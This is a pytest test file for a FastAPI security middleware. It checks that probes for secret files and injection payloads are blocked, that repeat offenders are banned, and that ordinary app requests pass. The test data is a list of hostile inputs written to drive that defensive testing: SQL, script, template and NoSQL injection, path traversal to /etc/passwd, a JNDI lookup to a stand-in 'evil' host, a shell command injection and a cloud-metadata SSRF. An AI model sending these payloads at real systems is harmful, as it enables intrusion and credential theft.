import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

from app.security.filters import attack_reason, ua_reason
from app.security.middleware import SecurityMiddleware
from app.security.settings import load_security_settings
from app.security.store import MemoryStore

BROWSER = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36"


def make(shield="1"):
    small = FastAPI()

    @small.get("/api/ok")
    def ok():
        return {"ok": True}

    @small.get("/login")
    def login():
        return {"page": True}

    store = MemoryStore()
    env = {"SMARTWATTS_ENV": "test", "SMARTWATTS_SHIELD": shield}
    small.add_middleware(SecurityMiddleware, settings=load_security_settings(env), store=store)
    return TestClient(small, headers={"User-Agent": BROWSER}), store


@pytest.mark.parametrize("url", [
    "/.env", "/.git/config", "/wp-admin/", "/phpmyadmin", "/index.php", "/backup.sql", "/site.zip",
    "/api/ok?id=1%20UNION%20SELECT%20password", "/api/ok?q=%3Cscript%3Ealert(1)%3C/script%3E",
    "/api/ok?f=../../etc/passwd", "/api/ok?x=${jndi:ldap://evil}", "/api/ok?cmd=;cat%20/etc/passwd",
    "/api/ok?t={{7*7}}", "/api/ok?__proto__[admin]=1", "/api/ok?u[$ne]=1",
    "/api/ok?url=http://169.254.169.254/latest", "/api/ok?a=%0d%0aSet-Cookie:x",
])
def test_attack_probes_are_refused(url):
    client, store = make()
    assert client.get(url).status_code == 403
    assert store._strikes, "a blocked request counts as a strike"


def test_attack_tools_and_header_injection():
    client, _ = make()
    assert client.get("/api/ok", headers={"User-Agent": "sqlmap/1.7"}).status_code == 403
    assert client.get("/api/ok", headers={"Referer": "${jndi:ldap://x}"}).status_code == 403


def test_three_filtered_requests_ban_the_ip():
    client, _ = make()
    for path in ("/.env", "/wp-login.php", "/.git/HEAD"):
        client.get(path)
    banned = client.get("/api/ok")
    assert banned.status_code == 403 and banned.headers["retry-after"] == "900"


def test_script_user_agents_refused_but_browsers_and_search_engines_pass():
    client, _ = make()
    assert client.get("/api/ok").status_code == 200
    assert client.get("/api/ok", headers={"User-Agent": "python-requests/2.32"}).status_code == 403
    assert client.get("/login", headers={"User-Agent": "Mozilla/5.0 (compatible; GPTBot/1.2)"}).status_code == 403
    assert client.get("/login", headers={"User-Agent": "Mozilla/5.0 HeadlessChrome/130"}).status_code == 403
    google = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
    fresh, _ = make()  # the client above is banned by now (3 strikes)
    assert fresh.get("/login", headers={"User-Agent": google}).status_code == 200


def test_user_agent_rules_follow_the_bot_protection_switch():
    client, _ = make(shield="0")
    assert client.get("/api/ok", headers={"User-Agent": "curl/8.0"}).status_code == 200


def test_normal_app_requests_are_not_flagged():
    for path, query in [
        ("/reset-password", "mode=resetPassword&oobCode=AbC-123_x&apiKey=AIzaSy&continueUrl=https%3A%2F%2Fsmartwatts.vercel.app%2Flogin&lang=en"),
        ("/api/rentals/properties/abc123/history", "limit=50&start=2026-01-01&end=2026-03-31&type=reading"),
        ("/nfc", "p=95a91e6b075f3fc4d9f4"),
        ("/assets/index-CR8yqPw1.js", ""),
    ]:
        assert attack_reason(path, query, {"user-agent": BROWSER}) == "", path
    assert ua_reason(BROWSER, page=True) == ""
